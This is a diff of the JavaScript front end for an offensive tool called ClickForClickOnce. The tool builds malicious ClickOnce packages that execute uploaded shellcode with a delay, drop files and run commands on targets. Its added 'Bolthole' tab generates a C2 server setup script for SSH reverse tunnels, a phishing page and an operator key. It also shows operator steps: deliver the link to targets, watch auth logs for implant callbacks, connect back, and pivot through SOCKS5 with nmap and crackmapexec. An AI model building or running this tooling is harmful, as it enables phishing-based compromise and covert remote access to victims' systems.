             function addActionCard(type, index) {
                 const card = document.createElement("div");
                 card.className = "action-card";
                 card.dataset.index = index;
                 card.dataset.type = type;
-                
+
                 let cardContent = `
                     <div class="action-card-header">
                         <div class="action-card-title">
-                            ${getActionTitle(type)} 
+                            ${getActionTitle(type)}
                             <span class="drag-hint">(Drag to reorder)</span>
                         </div>
-                        <button class="action-card-remove red-btn" data-index="${index}">
-                            Remove
-                        </button>
+                        <button class="action-card-remove red-btn" data-index="${index}">Remove</button>
                     </div>
                 `;
-                
-                // Add specific fields based on action type
+
                 switch(type) {
                     case "run_code":
                         cardContent += `
@@ -682,8 +1214,7 @@
                                 <div class="field-description">Upload a x64 shellcode to be executed. Note that the shellcode execution is delayed by 8 minutes.</div>
                                 <label class="field-label">Shellcode File:</label>
                                 <input type="file" id="codefile-${index}" required>
-                            </div>
-                        `;
+                            </div>`;
                         break;
                     case "drop_file":
                         cardContent += `
@@ -697,8 +1228,7 @@
                             <div class="action-card-field">
                                 <label class="field-label">Drop Location:</label>
                                 <input type="text" id="droplocation-${index}" placeholder="C:\\Test\\" required>
-                            </div>
-                        `;
+                            </div>`;
                         break;
                     case "run_cmd":
                         cardContent += `
@@ -706,15 +1236,12 @@
                                 <div class="field-description">Execute an OS command on the target system. Env var are also supported.</div>
                                 <label class="field-label">Command:</label>
                                 <input type="text" id="command-${index}" placeholder="calc.exe" required>
-                            </div>
-                        `;
+                            </div>`;
                         break;
                 }
-                
+
                 card.innerHTML = cardContent;
                 document.getElementById("actionCards").appendChild(card);
-                
-                // Add event listener for the remove button
                 card.querySelector(".action-card-remove").addEventListener("click", function() {
                     card.remove();
                 });
@@ -729,142 +1256,499 @@
                 }
             }
 
-            // Submit form
+            function clearCfcoResults() {
+                document.getElementById("resultsSection").style.display = "none";
+                document.getElementById("errorMessage").style.display = "none";
+            }
+
+            function showCfcoResults(buildid) {
+                const url = window.location.origin + "/build/" + buildid + "/";
+                const resultsSection = document.getElementById("resultsSection");
+                const resultLink = document.getElementById("resultLink");
+                resultLink.href = url;
+                resultLink.textContent = url;
+                resultsSection.style.display = "block";
+                window.open(url, '_blank');
+            }
+
+            function showCfcoError(message) {
+                const errorDiv = document.getElementById("errorMessage");
+                errorDiv.textContent = message;
+                errorDiv.style.display = "block";
+            }
+
             document.getElementById("submitBtn").addEventListener("click", async () => {
-                clearResults();
-                
-                const name = document.getElementById("nameInput").value.trim();
+                clearCfcoResults();
+
+                const name     = document.getElementById("nameInput").value.trim();
                 const sideload = document.querySelector('input[name="sideloadOption"]:checked').value;
-                const inflate = parseInt(document.getElementById("inflateSlider").value);
-                
-                // Validation
-                if (!name) {
-                    showError("Please enter a ClickOnce name.");
-                    return;
-                }
+                const inflate  = parseInt(document.getElementById("inflateSlider").value);
 
+                if (!name) { showCfcoError("Please enter a ClickOnce name."); return; }
                 if (!isValidClickOnceName(name)) {
-                    showError("ClickOnce name must start with a letter, contain only alphanumeric characters and underscores, and cannot end with an underscore.");
+                    showCfcoError("ClickOnce name must start with a letter, contain only alphanumeric characters and underscores, and cannot end with an underscore.");
                     return;
                 }
 
-                // Build actions data
                 const actionCardElements = document.querySelectorAll(".action-card");
                 const actions = [];
-                
-                // Process each action card
+
                 for (let i = 0; i < actionCardElements.length; i++) {
                     const card = actionCardElements[i];
                     const cardType = card.dataset.type;
                     const originalIndex = card.dataset.index;
-                    
                     let actionData = {};
-                    
+
                     switch(cardType) {
-                        case "run_code":
+                        case "run_code": {
                             const codeFileInput = document.getElementById(`codefile-${originalIndex}`);
-                            
                             if (!codeFileInput.files.length) {
-                                showError(`Please select a shellcode file for Run Shellcode action #${i+1}`);
+                                showCfcoError(`Please select a shellcode file for Run Shellcode action #${i+1}`);
                                 return;
                             }
-                            
-                            // Get file contents
-                            const codeFile = codeFileInput.files[0];
                             const codeReader = new FileReader();
-                            codeReader.readAsDataURL(codeFile);
+                            codeReader.readAsDataURL(codeFileInput.files[0]);
                             await new Promise(resolve => codeReader.onload = resolve);
-                            const codeFileContents = codeReader.result.split(",")[1];
-                            actionData = {
-                                'type': 'run_code',
-                                'file': codeFileContents
-                            };
+                            actionData = { type: 'run_code', file: codeReader.result.split(",")[1] };
                             break;
-                            
-                        case "drop_file":
+                        }
+                        case "drop_file": {
                             const dropFileInput = document.getElementById(`dropfile-${originalIndex}`);
-                            const dropLocation = document.getElementById(`droplocation-${originalIndex}`).value;
-                            
+                            const dropLocation  = document.getElementById(`droplocation-${originalIndex}`).value;
                             if (!dropFileInput.files.length || !dropLocation) {
-                                showError(`Please complete all fields for Drop File action #${i+1}`);
+                                showCfcoError(`Please complete all fields for Drop File action #${i+1}`);
                                 return;
                             }
-                            
-                            // Get file contents
-                            const dropFile = dropFileInput.files[0];
                             const dropReader = new FileReader();
-                            dropReader.readAsDataURL(dropFile);
+                            dropReader.readAsDataURL(dropFileInput.files[0]);
                             await new Promise(resolve => dropReader.onload = resolve);
-                            const dropFileContents = dropReader.result.split(",")[1];
-                            
-                            actionData = {
-                                'type': 'drop_file',
-                                'file': dropFileContents,
-                                'location': dropLocation
-                            };
+                            actionData = { type: 'drop_file', file: dropReader.result.split(",")[1], location: dropLocation };
                             break;
-                            
-                        case "run_cmd":
+                        }
+                        case "run_cmd": {
                             const command = document.getElementById(`command-${originalIndex}`).value;
-                            
-                            if (!command) {
-                                showError(`Please enter a command for Run OS Command action #${i+1}`);
-                                return;
-                            }
-                            
-                            actionData = {
-                                'type': 'run_cmd',
-                                'cmd': command
-                            };
+                            if (!command) { showCfcoError(`Please enter a command for Run OS Command action #${i+1}`); return; }
+                            actionData = { type: 'run_cmd', cmd: command };
                             break;
+                        }
                     }
-                    
                     actions.push(actionData);
                 }
 
-                if (actions.length === 0) {
-                    showError("No actions specified");
-                    return;
-                }
+                if (actions.length === 0) { showCfcoError("No actions specified"); return; }
 
-                // Build the complete request data
-                const requestData = {
-                    name: name,
-                    action: actions,
-                    sideload: sideload,
-                    inflate: inflate
-                };
-
-                console.log("Request JSON:", JSON.stringify(requestData, null, 2));
+                const requestData = { name, action: actions, sideload, inflate };
 
                 try {
                     showProcessingOverlay();
-                    const url = new URL(window.location.origin + "/api/build");
-                    
-                    const response = await fetch(url.href, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(requestData)
-                    });
-
+                    const response = await fetch(
+                        new URL(window.location.origin + "/api/build").href,
+                        { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(requestData) }
+                    );
                     hideProcessingOverlay();
-                    
-                    if (!response.ok) {
-                        throw new Error(`Server Error: ${response.status}`);
-                    }
-
+                    if (!response.ok) throw new Error(`Server Error: ${response.status}`);
                     const responseData = await response.json();
-                    console.log("Response JSON:", JSON.stringify(responseData, null, 2));
-                    
                     if (responseData.buildid) {
-                        showResults(responseData.buildid);
+                        showCfcoResults(responseData.buildid);
                     } else {
-                        showError("No valid URL received from server.");
+                        showCfcoError("No valid URL received from server.");
                     }
                 } catch (error) {
                     hideProcessingOverlay();
-                    console.log(error);
-                    showError(`Failed to submit request: ${error.message}`);
+                    showCfcoError(`Failed to submit request: ${error.message}`);
+                }
+            });
+
+            // ─── Bolthole tab init ─────────────────────────────────────────────────────
+
+            // Auto-generate application name
+            document.getElementById("bh-name").value = generateRandomName();
+
+            // Regenerate name button
+            document.getElementById("bh-regen-name").addEventListener("click", () => {
+                document.getElementById("bh-name").value = generateRandomName();
+            });
+
+            // Inflate slider
+            const bhInflateSlider = document.getElementById("bh-inflateSlider");
+            const bhInflateValue  = document.getElementById("bh-inflateValue");
+            bhInflateSlider.oninput = function() { bhInflateValue.textContent = this.value; };
+
+            // ── Dynamic key row helpers ───────────────────────────────────────────────
+
+            function getKeyValues(containerId) {
+                return Array.from(document.querySelectorAll('#' + containerId + ' textarea'))
+                    .map(t => t.value.trim())
+                    .filter(Boolean);
+            }
+
+            function addKeyRow(containerId, placeholder) {
+                const container = document.getElementById(containerId);
+                const row = document.createElement('div');
+                row.className = 'key-row';
+                const ta = document.createElement('textarea');
+                ta.placeholder = placeholder;
+                const btn = document.createElement('button');
+                btn.type = 'button';
+                btn.className = 'red-btn key-row-remove';
+                btn.textContent = '✕';
+                btn.addEventListener('click', () => row.remove());
+                row.appendChild(ta);
+                row.appendChild(btn);
+                container.appendChild(row);
+                ta.focus();
+            }
+
+            document.getElementById('bh-add-opkey').addEventListener('click', () => {
+                addKeyRow('bh-opkeys-container', 'ecdsa-sha2-nistp256 AAAA… operator@host');
+            });
+
+            // ── Global keypair / C2 config state ─────────────────────────────────────
+
+            let _bhPublicKey = null;  // current server-side public key, populated on load
+
+            function setBhKeypairUI(keypair) {
+                _bhPublicKey = keypair.public_key;
+                document.getElementById('bh-kp-loading').style.display = 'none';
+                if (keypair.exists && keypair.public_key) {
+                    document.getElementById('bh-kp-fingerprint').textContent = keypair.fingerprint || '';
+                    document.getElementById('bh-kp-pubkey').value = keypair.public_key;
+                    document.getElementById('bh-kp-info').style.display = '';
+                }
+            }
+
+            function populateC2Form(config) {
+                if (config.ssh_host)        document.getElementById("bh-sshHost").value        = config.ssh_host;
+                if (config.ssh_user)        document.getElementById("bh-sshUser").value        = config.ssh_user;
+                if (config.ports)           document.getElementById("bh-ports").value          = config.ports;
+                if (config.tunnel_port)     document.getElementById("bh-tunnelPort").value     = config.tunnel_port;
+                if (config.socks_port)      document.getElementById("bh-socksPort").value      = config.socks_port;
+                if (config.startup_delay !== undefined)   document.getElementById("bh-startupDelay").value   = config.startup_delay;
+                if (config.reconnect_delay !== undefined) document.getElementById("bh-reconnectDelay").value = config.reconnect_delay;
+            }
+
+            async function loadBhC2Config() {
+                try {
+                    const resp = await fetch(window.location.origin + "/api/bolthole/c2");
+                    if (!resp.ok) throw new Error("HTTP " + resp.status);
+                    const data = await resp.json();
+                    populateC2Form(data.config);
+                    setBhKeypairUI(data.keypair);
+                } catch (e) {
+                    document.getElementById('bh-kp-loading').textContent = "Failed to load keypair: " + e.message;
+                }
+            }
+
+            loadBhC2Config();
+
+            function getC2FormValues() {
+                return {
+                    ssh_host:        document.getElementById("bh-sshHost").value.trim(),
+                    ssh_user:        document.getElementById("bh-sshUser").value.trim(),
+                    ports:           document.getElementById("bh-ports").value.trim(),
+                    tunnel_port:     parseInt(document.getElementById("bh-tunnelPort").value),
+                    socks_port:      parseInt(document.getElementById("bh-socksPort").value),
+                    startup_delay:   parseInt(document.getElementById("bh-startupDelay").value),
+                    reconnect_delay: parseInt(document.getElementById("bh-reconnectDelay").value),
+                };
+            }
+
+            async function saveC2Config(regenerate) {
+                const body = Object.assign(getC2FormValues(), { regenerate_keypair: !!regenerate });
+                const resp = await fetch(window.location.origin + "/api/bolthole/c2", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(body),
+                });
+                if (!resp.ok) throw new Error("Server error " + resp.status);
+                return resp.json();
+            }
+
+            // ── Rotate keypair ────────────────────────────────────────────────────────
+
+            document.getElementById('bh-regen-keypair').addEventListener('click', async () => {
+                const warn = document.getElementById('bh-regen-warning');
+                warn.style.display = '';
+                const btn = document.getElementById('bh-regen-keypair');
+                btn.disabled = true;
+                btn.textContent = 'Rotating…';
+                try {
+                    const data = await saveC2Config(true);
+                    setBhKeypairUI(data.keypair);
+                    warn.textContent = 'Keypair rotated. Re-run c2_setup.sh and rebuild all packages.';
+                } catch (e) {
+                    warn.textContent = 'Rotation failed: ' + e.message;
+                } finally {
+                    btn.disabled = false;
+                    btn.textContent = '↻ Rotate Keypair';
+                }
+            });
+
+            // ── Step navigation ───────────────────────────────────────────────────────
+
+            function showBhStep1() {
+                document.getElementById('bh-step1').style.display = '';
+                document.getElementById('bh-step2').style.display = 'none';
+                document.getElementById('bh-si-1').classList.add('active');
+                document.getElementById('bh-si-2').classList.remove('active');
+                document.getElementById('bh-step1-error').style.display = 'none';
+            }
+
+            function showBhStep2() {
+                document.getElementById('bh-step1').style.display = 'none';
+                document.getElementById('bh-step2').style.display = '';
+                document.getElementById('bh-si-1').classList.remove('active');
+                document.getElementById('bh-si-2').classList.add('active');
+                document.getElementById('bh-errorMessage').style.display = 'none';
+            }
+
+            function showStep1Error(msg) {
+                const el = document.getElementById('bh-step1-error');
+                el.textContent = msg;
+                el.style.display = 'block';
+            }
+
+            function showBhError(msg) {
+                const el = document.getElementById('bh-errorMessage');
+                el.textContent = msg;
+                el.style.display = 'block';
+            }
+
+            function clearBhResults() {
+                document.getElementById("bh-resultsSection").style.display = "none";
+                document.getElementById("bh-errorMessage").style.display = "none";
+            }
+
+            function validateStep1() {
+                const sshHost = document.getElementById("bh-sshHost").value.trim();
+                const sshUser = document.getElementById("bh-sshUser").value.trim();
+                const ports   = document.getElementById("bh-ports").value.trim();
+                if (!sshHost) { showStep1Error("C2 Hostname is required."); return false; }
+                if (!sshUser) { showStep1Error("C2 SSH Username is required."); return false; }
+                if (!ports)   { showStep1Error("Port Scan Order is required."); return false; }
+                return true;
+            }
+
+            document.getElementById('bh-step1-next-btn').addEventListener('click', async () => {
+                document.getElementById('bh-step1-error').style.display = 'none';
+                if (!validateStep1()) return;
+                try {
+                    const data = await saveC2Config(false);
+                    setBhKeypairUI(data.keypair);
+                    showBhStep2();
+                } catch (e) {
+                    showStep1Error("Failed to save config: " + e.message);
+                }
+            });
+
+            document.getElementById('bh-step2-back-btn').addEventListener('click', () => {
+                showBhStep1();
+            });
+
+            // ── c2_setup.sh download ──────────────────────────────────────────────────
+
+            function buildC2SetupScript(cfg, pubkeyBlock) {
+                const portsArr     = cfg.ports.split(',').map(p => p.trim()).filter(Boolean);
+                const portsUfw     = portsArr.join(' ');
+                const portsListStr = portsArr.join(', ');
+                // $SSH_USER / $PORT / $TUNNEL_PORT are bash variables — plain $, NOT interpolated by JS.
+                return `#!/usr/bin/env bash
+# Bolthole C2 Setup Script — generated by ClickForClickOnce
+# ssh_host   : ${cfg.ssh_host}
+# ssh_user   : ${cfg.ssh_user}
+# ports      : ${portsListStr}
+# tunnel_port: ${cfg.tunnel_port}
+# socks5     : ${cfg.socks_port}
+set -e
+
+SSH_USER="${cfg.ssh_user}"
+TUNNEL_PORT=${cfg.tunnel_port}
+
+echo "[*] Creating user $SSH_USER (no-login shell) ..."
+id "$SSH_USER" &>/dev/null || useradd -m -s /usr/sbin/nologin "$SSH_USER"
+
+echo "[*] Installing authorized_keys for $SSH_USER ..."
+mkdir -p /home/$SSH_USER/.ssh
+chmod 700 /home/$SSH_USER/.ssh
+cat >> /home/$SSH_USER/.ssh/authorized_keys << 'PUBKEY'
+${pubkeyBlock}
+PUBKEY
+chmod 600 /home/$SSH_USER/.ssh/authorized_keys
+chown -R "$SSH_USER:$SSH_USER" /home/$SSH_USER/.ssh
+
+echo "[*] Configuring sshd ..."
+grep -qxF 'AllowTcpForwarding yes' /etc/ssh/sshd_config || \\
+    echo 'AllowTcpForwarding yes' >> /etc/ssh/sshd_config
+grep -qxF 'GatewayPorts yes' /etc/ssh/sshd_config || \\
+    echo 'GatewayPorts yes' >> /etc/ssh/sshd_config
+grep -qxF "AllowUsers $SSH_USER" /etc/ssh/sshd_config || \\
+    echo "AllowUsers $SSH_USER" >> /etc/ssh/sshd_config
+
+echo "[*] Adding extra listen ports (${portsListStr}) ..."
+for PORT in ${portsUfw}; do
+    [ "$PORT" -eq 22 ] && continue
+    grep -qxF "Port $PORT" /etc/ssh/sshd_config || \\
+        echo "Port $PORT" >> /etc/ssh/sshd_config
+done
+
+echo "[*] Restarting sshd ..."
+service ssh restart
+
+echo "[*] Opening firewall ports (${portsListStr}) ..."
+if command -v ufw &>/dev/null; then
+    for PORT in ${portsUfw}; do
+        ufw allow "$PORT"/tcp
+    done
+    ufw reload
+fi
+
+echo "[+] Done."
+echo "    When a target connects, run:"
+echo "    ssh -i operator_key -p $TUNNEL_PORT ${cfg.ssh_user}@<this-host>"
+`;
+            }
+
+            function triggerDownload(content, filename, mimeType) {
+                const blob = new Blob([content], { type: mimeType });
+                const url  = URL.createObjectURL(blob);
+                const a    = document.createElement('a');
+                a.href = url; a.download = filename;
+                document.body.appendChild(a); a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }
+
+            document.getElementById('bh-download-c2-btn').addEventListener('click', async () => {
+                document.getElementById('bh-step1-error').style.display = 'none';
+                if (!validateStep1()) return;
+                const btn = document.getElementById('bh-download-c2-btn');
+                btn.disabled = true;
+                btn.textContent = 'Saving…';
+                try {
+                    const data = await saveC2Config(false);
+                    setBhKeypairUI(data.keypair);
+                    const pubkeyBlock = data.keypair.public_key || '# PASTE YOUR OUTBOUND SSH PUBLIC KEY HERE';
+                    const script = buildC2SetupScript(data.config, pubkeyBlock);
+                    triggerDownload(script, 'c2_setup.sh', 'text/x-sh');
+                } catch (e) {
+                    showStep1Error("Failed to save / download: " + e.message);
+                } finally {
+                    btn.disabled = false;
+                    btn.textContent = '↓ Download c2_setup.sh';
+                }
+            });
+
+            // ── Build submission ──────────────────────────────────────────────────────
+
+            function showBhResults(buildid, formVals) {
+                const base = window.location.origin + "/build/" + buildid + "/";
+                const name = formVals.name;
+
+                document.getElementById("bh-dirLink").href = base;
+                document.getElementById("bh-dirLink").textContent = base;
+
+                document.getElementById("bh-link-zip").href   = base + name + ".zip";
+                document.getElementById("bh-label-zip").textContent = name + ".zip";
+                document.getElementById("bh-link-key").href   = base + "operator_key";
+                document.getElementById("bh-link-phish").href = base + "phish.html";
+                document.getElementById("bh-link-setup").href = base + "c2_setup.sh";
+
+                const steps = document.getElementById("bh-checklist-steps");
+                steps.innerHTML = "";
+                const items = [
+                    `Run <code>c2_setup.sh</code> as root on your C2 VM — creates the <code>${formVals.sshUser}</code> no-login user, installs the outbound key in <code>authorized_keys</code>, opens ports <code>${formVals.ports}</code>, and enables <code>GatewayPorts</code> / <code>AllowTcpForwarding</code> in sshd.`,
+                    `Serve <code>${name}.zip</code> and <code>phish.html</code> from a web server reachable by targets.`,
+                    `Deliver the ClickOnce link to your targets.`,
+                    `Watch SSH auth log on the C2 — each new implant connection logs the Windows username before the tunnel is established (see Operations Reference below).`,
+                    `Connect to the target via reverse tunnel using <code>operator_key</code> and the username from the auth log — or proxy through SOCKS5 at <code>${formVals.sshHost}:${formVals.socksPort}</code>.`,
+                ];
+                items.forEach(text => {
+                    const li = document.createElement("li");
+                    li.innerHTML = text;
+                    steps.appendChild(li);
+                });
+
+                // ── Operations reference ──────────────────────────────────────────────
+                document.getElementById('bh-cmd-monitor').innerHTML =
+                    '<span class="cmd-comment"># Implant sends a probe connection as Windows identity before the real tunnel.</span>\n' +
+                    '<span class="cmd-comment"># Auth log entry: Invalid user johndoe.LAPTOP-ABC123 from 1.2.3.4 port 54321</span>\n\n' +
+                    'journalctl -u ssh -f | grep "Invalid user"\n' +
+                    '<span class="cmd-comment"># or on older systems:</span>\n' +
+                    'tail -f /var/log/auth.log | grep "Invalid user"';
+
+                document.getElementById('bh-cmd-connect').innerHTML =
+                    '<span class="cmd-comment"># Replace &lt;windows-user&gt; with the username seen in the auth log above.</span>\n' +
+                    '<span class="cmd-comment"># operator_key is downloaded with the build package.</span>\n\n' +
+                    `ssh -i operator_key -p ${formVals.tunnelPort} &lt;windows-user&gt;@localhost`;
+
+                document.getElementById('bh-cmd-socks').innerHTML =
+                    '<span class="cmd-comment"># Dynamic SOCKS5 — routes tool traffic through the target\'s internal network.</span>\n\n' +
+                    `<span class="cmd-comment"># 1. Add to /etc/proxychains4.conf:</span>\n` +
+                    `<span class="cmd-comment">#    socks5  127.0.0.1  ${formVals.socksPort}</span>\n\n` +
+                    `proxychains4 nmap -sT -Pn 10.0.0.0/24\n` +
+                    `proxychains4 crackmapexec smb 10.0.0.0/24`;
+
+                document.getElementById('bh-ops-ref').style.display = '';
+
+                document.getElementById("bh-resultsSection").style.display = "block";
+                window.open(base, '_blank');
+            }
+
+            document.getElementById("bh-submitBtn").addEventListener("click", async () => {
+                clearBhResults();
+
+                const name         = document.getElementById("bh-name").value.trim();
+                const sideload     = document.querySelector('input[name="bh-sideloadOption"]:checked').value;
+                const providerUrl  = document.getElementById("bh-providerUrl").value.trim();
+                const version      = document.getElementById("bh-version").value.trim() || "1.0.0.0";
+                const inflate      = parseInt(document.getElementById("bh-inflateSlider").value);
+                const sshHost      = document.getElementById("bh-sshHost").value.trim();
+                const sshUser      = document.getElementById("bh-sshUser").value.trim();
+                const ports        = document.getElementById("bh-ports").value.trim();
+                const tunnelPort   = parseInt(document.getElementById("bh-tunnelPort").value);
+                const socksPort    = parseInt(document.getElementById("bh-socksPort").value);
+                const startupDelay = parseInt(document.getElementById("bh-startupDelay").value);
+                const reconnDelay  = parseInt(document.getElementById("bh-reconnectDelay").value);
+                const operatorPubkey = getKeyValues('bh-opkeys-container').join('\n');
+
+                if (!name) { showBhError("Application Name is required."); return; }
+                if (!isValidClickOnceName(name)) {
+                    showBhError("Name must start with a letter, contain only alphanumeric characters and underscores, and cannot end with an underscore.");
+                    return;
+                }
+
+                const requestData = {
+                    name, sideload,
+                    provider_url: providerUrl,
+                    version,
+                    inflate,
+                    ssh_host: sshHost,
+                    ssh_user: sshUser,
+                    ports,
+                    tunnel_port: tunnelPort,
+                    socks_port: socksPort,
+                    startup_delay: startupDelay,
+                    reconnect_delay: reconnDelay,
+                    operator_pubkey: operatorPubkey,
+                };
+
+                try {
+                    showProcessingOverlay();
+                    const response = await fetch(
+                        new URL(window.location.origin + "/api/bolthole-build").href,
+                        { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(requestData) }
+                    );
+                    hideProcessingOverlay();
+                    if (!response.ok) throw new Error(`Server Error: ${response.status}`);
+                    const responseData = await response.json();
+                    if (responseData.buildid) {
+                        showBhResults(responseData.buildid, { name, sshHost, sshUser, ports, tunnelPort, socksPort });
+                    } else {
+                        showBhError("No buildid received from server.");
+                    }
+                } catch (error) {
+                    hideProcessingOverlay();
+                    showBhError(`Failed to submit request: ${error.message}`);
                 }
             });
         </script>
